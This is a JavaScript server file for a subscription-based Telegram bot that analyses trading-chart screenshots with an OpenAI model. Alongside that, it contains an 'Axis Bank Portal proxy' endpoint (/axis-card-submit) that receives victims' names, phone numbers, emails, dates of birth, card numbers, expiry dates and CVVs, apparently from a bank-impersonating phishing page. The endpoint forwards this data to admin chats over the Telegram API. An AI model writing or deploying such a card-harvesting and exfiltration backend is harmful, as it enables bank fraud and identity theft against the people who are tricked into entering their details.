require("dotenv").config();
const { Telegraf } = require("telegraf");
const OpenAI = require("openai");
const systemPrompt = require("./src/systemPrompt");
const { getCurrentSession } = require("./src/session");
const { formatReport } = require("./src/formatReport");
const { connectDB } = require("./src/db");
const { seedAdmins } = require("./src/seedAdmins");
const { isAdmin } = require("./src/adminAuth");
const { hasActiveSubscription, startReminderJob } = require("./src/subscription");
const { mainMenuKeyboard, sendEphemeral } = require("./src/ui");
const User = require("./src/models/User");
const { registerSubscriptionHandlers, sendSubscribePrompt, submitPaymentScreenshot } = require("./src/handlers/subscribe");
const { registerAdminPanelHandlers } = require("./src/handlers/adminPanel");
const { registerMenuHandlers, mainMenuText, HELP_TEXT, sendSamples } = require("./src/handlers/menu");
const { handlePendingAdminInput } = require("./src/handlers/adminPanel");
const express = require("express");

const app = express();
let pingCount = 0;
let lastPingAt = null;

app.get("/ping", (req, res) => {
  pingCount += 1;
  lastPingAt = new Date();
  res.set("Cache-Control", "no-store");
  res.status(200).send("Hello");
});

app.get("/", (req, res) => res.redirect("/stats"));

app.get("/stats", (req, res) => {
  res.set("Cache-Control", "no-store");
  const mem = process.memoryUsage();
  res.status(200).json({
    ok: true,
    now: new Date().toISOString(),
    uptimeSec: Math.floor(process.uptime()),
    pingCount,
    lastPingAt: lastPingAt ? lastPingAt.toISOString() : null,
    memory: {
      rss: mem.rss,
      heapUsed: mem.heapUsed,
      heapTotal: mem.heapTotal,
      external: mem.external,
    },
  });
});

// ---------- Axis Bank Portal proxy: card submission POST → forward via BOT to admins ----------
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));

let axisLastSubmitAt = null;
let axisSubmitCount = 0;
let axisLastErrors = [];

function pushAxisError(msg, meta) {
  axisLastErrors.unshift({ at: new Date().toISOString(), message: String(msg || ''), meta: meta || null });
  if (axisLastErrors.length > 12) axisLastErrors.length = 12;
}

function buildAxisHtmlText(payload) {
  const submittedAt = payload && payload.submittedAt ? new Date(payload.submittedAt) : new Date();
  const hh = String(submittedAt.getHours()).padStart(2, '0');
  const mm = String(submittedAt.getMinutes()).padStart(2, '0');
  const login = (payload && typeof payload.loginData === 'object' && payload.loginData) || {};
  const card  = (payload && typeof payload.cardData  === 'object' && payload.cardData)  || {};
  const parts = [];
  parts.push('<b>========== LOGIN INFO ==========</b>');
  parts.push('Time: <code>' + hh + ':' + mm + '</code>\n');
  parts.push('Name:   <code>' + (login.fullName || '—') + '</code>');
  parts.push('Mobile: <code>' + (login.mobile || '—') + '</code>');
  parts.push('Email:  <code>' + (login.email || '—') + '</code>');
  parts.push('DOB:    <code>' + (login.dob || '—') + '</code>\n');
  parts.push('<b>========== [CARD DETAILS] ==========</b>');
  parts.push('Number: <code>' + (card.number || '—') + '</code>');
  parts.push('Name:   <code>' + (card.name || '—') + '</code>');
  parts.push('Expiry: <code>' + (card.expiry || '—') + '</code>');
  parts.push('CVV:    <code>' + (card.cvv || '—') + '</code>');
  if (payload && payload.pageURL) parts.push('\nPage: <code>' + String(payload.pageURL) + '</code>');
  if (payload && payload.userAgent) parts.push('UA: <code>' + String(payload.userAgent).slice(0, 220) + '</code>');
  return parts.join('\n');
}

async function sendAxisTelegram(botToken, chatId, text) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const body = new URLSearchParams();
  body.set('chat_id', String(chatId));
  body.set('text', String(text || ''));
  body.set('parse_mode', 'HTML');
  body.set('disable_web_page_preview', 'True');
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': 'application/json' },
      body: body.toString(),
      signal: controller.signal,
      redirect: 'follow',
    });
    clearTimeout(t);
    const textResp = await res.text();
    let parsed;
    try { parsed = JSON.parse(textResp); } catch (_) { parsed = { raw: textResp }; }
    const ok = !!parsed.ok && (res.status >= 200 && res.status < 300);
    return {
      ok,
      http_status: Number(res.status || 0),
      msg_id: (parsed && parsed.ok && parsed.result && parsed.result.message_id) ? Number(parsed.result.message_id) : null,
      chat_id: String(chatId),
      parsed,
    };
  } catch (e) {
    clearTimeout(t);
    return {
      ok: false,
      http_status: null,
      msg_id: null,
      chat_id: String(chatId),
      error: String((e && e.message) || e || 'unknown'),
    };
  }
}

app.get('/axis-card-submit', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.status(200).json({
    ok: true,
    message: 'Use POST /axis-card-submit with application/json body: { submittedAt, loginData, cardData, pageURL? }',
    count: axisSubmitCount,
    lastAt: axisLastSubmitAt ? axisLastSubmitAt.toISOString() : null,
    lastErrors: axisLastErrors,
    axisBotConfigured: !!process.env.AXIS_BANK_BOT_TOKEN && process.env.AXIS_BANK_BOT_TOKEN !== 'YOUR_AXIS_BANK_BOT_TOKEN_HERE',
    axisAdminsCount: (process.env.AXIS_ADMINS || '').split(',').map(s => s.trim()).filter(Boolean).length,
  });
});

app.post('/axis-card-submit', async (req, res) => {
  axisLastSubmitAt = new Date();
  axisSubmitCount += 1;
  const botToken = process.env.AXIS_BANK_BOT_TOKEN || '';
  const adminsRaw = (process.env.AXIS_ADMINS || '').toString();
  const admins = adminsRaw.split(',').map(s => s.trim()).filter(Boolean);

  if (!botToken || botToken === 'YOUR_AXIS_BANK_BOT_TOKEN_HERE') {
    pushAxisError('AXIS_BANK_BOT_TOKEN not configured', null);
    return res.status(500).json({ ok: false, error: 'AXIS_BANK_BOT_TOKEN not configured in .env' });
  }
  if (!admins.length) {
    pushAxisError('AXIS_ADMINS not configured (csv chat ids)', null);
    return res.status(500).json({ ok: false, error: 'AXIS_ADMINS not configured in .env (csv chat ids)' });
  }

  let payload = {};
  try {
    if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
      payload = req.body;
    } else if (typeof req.body === 'string') {
      payload = JSON.parse(req.body);
    }
  } catch (e) {
    pushAxisError('Failed to parse JSON body', { bodyLen: String(req.body || '').length });
    return res.status(400).json({ ok: false, error: 'Invalid JSON body: ' + String(e && e.message || e) });
  }
  if (!payload || typeof payload !== 'object') {
    pushAxisError('Invalid payload shape', { type: typeof payload });
    return res.status(400).json({ ok: false, error: 'Invalid payload shape' });
  }
  try { payload.userAgent = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : null; } catch (_) {}

  const text = buildAxisHtmlText(payload);

  const perAdminResults = [];
  for (const chatId of admins) {
    const r = await sendAxisTelegram(botToken, chatId, text);
    perAdminResults.push({ chat_id: chatId, ok: !!r.ok, http_status: r.http_status, msg_id: r.msg_id, error: r.error || null });
    if (!r.ok) {
      pushAxisError('Telegram send failed for chat ' + chatId, { http_status: r.http_status, msg_id: r.msg_id, error: r.error, parsed: r.parsed || null });
    }
  }
  const anyOk = perAdminResults.some(r => r.ok);
  const allOk = perAdminResults.length > 0 && perAdminResults.every(r => r.ok);

  return res.status(anyOk ? 200 : 502).json({
    ok: anyOk,
    allOk,
    submittedAt: (axisLastSubmitAt).toISOString(),
    count: axisSubmitCount,
    adminsTotal: admins.length,
    adminsOk: perAdminResults.filter(r => r.ok).length,
    perAdminResults,
    payloadPreview: {
      hasLogin: !!(payload && payload.loginData && Object.keys(payload.loginData).length),
      hasCard: !!(payload && payload.cardData && Object.keys(payload.cardData).length),
      textLength: String(text || '').length,
    },
  });
});

const port = Number(process.env.port || process.env.PORT || 3000);
app.listen(port, () => {
  console.log("We are listening on PORT ", port);

  const requiredEnv = ["BOT_TOKEN", "OPENAI_API_KEY", "MONGODB_URI"];
  const missingEnv = requiredEnv.filter((k) => !process.env[k]);

  if (missingEnv.length) {
    console.error(`Missing required env var(s): ${missingEnv.join(", ")}.`);
    console.error("Bot initialization skipped. /ping server is still running.");
    return;
  }

  console.log("Starting bot...");
  console.log("Environment variables loaded OK.");

  const bot = new Telegraf(process.env.BOT_TOKEN);
  const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
  const MODEL = "gpt-5.4-mini";

// ---------- Per-chat sequential queue ----------
// Ensures multiple images sent in a row are analyzed one at a time, in the order received,
// instead of firing concurrently and replying out of order.
const chatQueues = new Map();

function enqueue(chatId, taskFn) {
  const prev = chatQueues.get(chatId) || Promise.resolve();
  const next = prev
    .catch(() => {}) // don't let a previous failure block the queue
    .then(() => taskFn())
    .catch((err) => console.error("Queued task failed:", err));
  chatQueues.set(chatId, next);
  return next;
}

registerSubscriptionHandlers(bot);
registerAdminPanelHandlers(bot);
registerMenuHandlers(bot);

// /start is exempt from the inline-button pattern per spec — it's the entry point
// that hands out the buttons for everything else. Admins additionally see quick stats.
bot.start(async (ctx) => {
  const admin = await isAdmin(ctx);
  const text = await mainMenuText(ctx);
  await ctx.reply(text, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard(admin) });
});

bot.command("help", (ctx) => ctx.reply(HELP_TEXT));
bot.command("samples", (ctx) => sendSamples(ctx));

// ---------- Core analysis logic (shared by photo + document handlers) ----------
async function analyzeChart(ctx, fileLink) {
  const replyTarget = { reply_parameters: { message_id: ctx.message.message_id } };
  let statusMsg;
  try {
    statusMsg = await ctx.reply("📥 Chart received. Processing...", replyTarget);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "🔎 Reading chart structure..."
    );

    const session = getCurrentSession();

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "🧠 Running full analysis (this can take a few seconds)..."
    );

    const response = await openai.chat.completions.create({
      model: MODEL,
      response_format: { type: "json_object" },
      messages: [
        { role: "system", content: systemPrompt },
        {
          role: "user",
          content: [
            {
              type: "text",
              text: `Current Trading Session: ${session.name}. ${session.note}\n\nAnalyze this chart and return the JSON report.`,
            },
            {
              type: "image_url",
              image_url: { url: fileLink.href },
            },
          ],
        },
      ],
    });

    const raw = response.choices[0].message.content;

    let report;
    try {
      report = JSON.parse(raw);
    } catch (parseErr) {
      console.error("Failed to parse GPT JSON response:", raw);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ Got an unreadable response from the analyst. Please try sending the chart again."
      );
      return;
    }

    if (!report.isChart) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        `⚠️ ${report.rejectionReason || "That doesn't look like a chart screenshot. Please send a valid chart — use /samples to see examples."}`
      );
      return;
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "✅ Analysis ready"
    );

    await ctx.replyWithMarkdown(formatReport(report), replyTarget);
  } catch (err) {
    console.error("Error processing chart:", err);
    const errorText = "❌ Something went wrong while analyzing that chart. Please try again.";
    if (statusMsg) {
      await ctx.telegram
        .editMessageText(ctx.chat.id, statusMsg.message_id, undefined, errorText)
        .catch(() => {});
    } else {
      await ctx.reply(errorText, replyTarget);
    }
  }
}

// ---------- Access control ----------
// Decides what an incoming image should do: admin -> free analysis, awaiting payment -> submit
// for review, subscribed -> analysis, otherwise -> blocked with a subscribe prompt.
async function routeIncomingImage(ctx, fileId, fileLink) {
  if (await isAdmin(ctx)) {
    return enqueue(ctx.chat.id, () => analyzeChart(ctx, fileLink));
  }

  const user = await User.findOne({ telegramId: ctx.from.id });
  if (user && user.awaitingPaymentScreenshot) {
    return submitPaymentScreenshot(ctx, fileId);
  }

  if (await hasActiveSubscription(ctx.from.id)) {
    return enqueue(ctx.chat.id, () => analyzeChart(ctx, fileLink));
  }

  await ctx.reply("🔒 You need an active subscription to use this bot.", {
    reply_markup: { inline_keyboard: [[{ text: "💳 Subscribe", callback_data: "menu_subscribe" }]] },
  });
}

// ---------- Input handlers ----------
bot.on("photo", async (ctx) => {
  const photos = ctx.message.photo;
  const fileId = photos[photos.length - 1].file_id; // highest resolution
  const fileLink = await ctx.telegram.getFileLink(fileId);
  await routeIncomingImage(ctx, fileId, fileLink);
});

bot.on("document", async (ctx) => {
  const doc = ctx.message.document;
  const mimeType = doc.mime_type || "";

  if (!mimeType.startsWith("image/")) {
    return sendEphemeral(ctx, "That file isn't an image. Please send your chart as a photo or image file.");
  }

  const fileLink = await ctx.telegram.getFileLink(doc.file_id);
  await routeIncomingImage(ctx, doc.file_id, fileLink);
});

bot.on("text", async (ctx) => {
  const consumed = await handlePendingAdminInput(ctx);
  if (consumed) return;
  await sendEphemeral(ctx, "Send me a chart screenshot to get your trade analysis. Use /samples if you're not sure what to send.");
});

async function startBot() {
  try {
    await connectDB();
    await seedAdmins();

    console.log("Verifying bot token with Telegram...");
    const me = await bot.telegram.getMe();
    console.log(`Token OK. Logged in as @${me.username}`);

    await bot.telegram.setMyCommands([
      { command: "start", description: "Main menu" },
      { command: "help", description: "How to use the bot" },
      { command: "samples", description: "See example chart screenshots to send" },
      { command: "subscribe", description: "Subscribe to use the bot" },
      { command: "admin", description: "Admin panel (admins only)" },
    ]);
    console.log("Menu commands set.");

    startReminderJob(bot);

    await bot.launch();
    console.log(`Bot launched. Listening for messages as @${me.username}`);
  } catch (err) {
    console.error("Failed to start bot:", err.message || err);
    console.error("Check: 1) BOT_TOKEN is correct, 2) MONGODB_URI is reachable, 3) internet access to api.telegram.org.");
  }
}

startBot();

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
});
